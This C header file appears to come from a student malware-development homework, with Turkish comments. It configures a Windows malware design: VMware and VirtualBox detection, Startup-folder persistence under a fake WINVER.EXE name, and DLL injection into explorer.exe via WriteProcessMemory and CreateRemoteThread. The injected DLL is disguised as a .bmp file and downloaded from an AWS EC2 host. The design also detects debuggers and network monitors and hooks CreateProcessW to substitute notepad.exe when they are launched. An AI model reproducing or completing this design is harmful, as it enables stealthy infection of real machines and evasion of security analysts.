#pragma once

#define WANTED_USERNAME			TEXT("BGM532StudentHW3")
// kayýt defterinden VMWARE ve VBOX tespiti
#define SVCHKEY					HKEY_LOCAL_MACHINE
#define VMWARE_REG_PATH			TEXT("SYSTEM\\CurrentControlSet\\Enum\\Root\\LEGACY_VMTOOLS\\0000")
#define VMWARE_REG_KEYVALUE		TEXT("DeviceDesc")

// SYSTEM\ControlSet001\Enum\Root\LEGACY_VMTOOLS\0000
// DeviceDesc -> "VMware Tools"

// Klasör varlýðý ile VM ve vbox kontrolü
#define VMTOOLS_FOLDER			TEXT("C:\\Program Files\\VMware\\VMware Tools")
#define VBOX_FOLDER				TEXT("C:\\Program Files\\VBadds")
// exe autostart klasörü
#define AUTOSTART_PATH_ENV_VAR	TEXT("ALLUSERSPROFILE")
#define AUTOSTART_PATH_EK		TEXT("Start Menu\\Programs\\Startup")
#define AUTOSTART_EXE_NAME		TEXT("WINVER.EXE") //bunu rasgele yapalým
// hangi prosese hangi dll inject edilecek
#define INJ_TARGET_PROC_NAME	TEXT("explorer.exe")
#define INJ_DLL_PATH_ENV_VAR	TEXT("SystemRoot")
#define INJ_DLL_NAME			TEXT("RiverNevada.bmp") // bunu da rasgele yapalým
// dll nereden gelecek
#define DLL_DWNLD_URL			TEXT("http://ec2-52-24-152-136.us-west-2.compute.amazonaws.com/")
// #define DLL_DWNLD_URL			TEXT("http://192.168.233.1/")
#define DLL_DWNLD_FILENAME		TEXT("WSD_YHN.zip")
// sifreler 
#define KATAR_SIFRE				"SIFREM"
#define	DLL_SIFRE				"DLLSIF"

#define SIFRE_SIZE				6
// rasgele proses ismi
#define RANDOM_PROC_NAME		TEXT("XXYYZZ")
// kontrol edilen proses isimleri
#define PROCNAME01				TEXT("immunity")
#define PROCNAME02				TEXT("processhacker")
#define PROCNAME03				TEXT("procmon")
#define PROCNAME04				TEXT("ollydbg")
#define PROCNAME05				TEXT("netmon")
#define PROCNAME06				TEXT("wireshark")

#define HOOKDLL					TEXT("Kernel32.dll")
#define HOOKFUNC				"CreateProcessW"
#define CHOSENEXENAME			TEXT("c:/windows/system32/notepad.exe") // yukarýdakiler yerine çalýþacak olan exe

#define RUNTIME_LOAD_DLL		TEXT("Kernel32.dll")
#define RUNTIME_LOAD_FUNC2		"WriteProcessMemory"
#define RUNTIME_LOAD_FUNC3		"CreateRemoteThread"
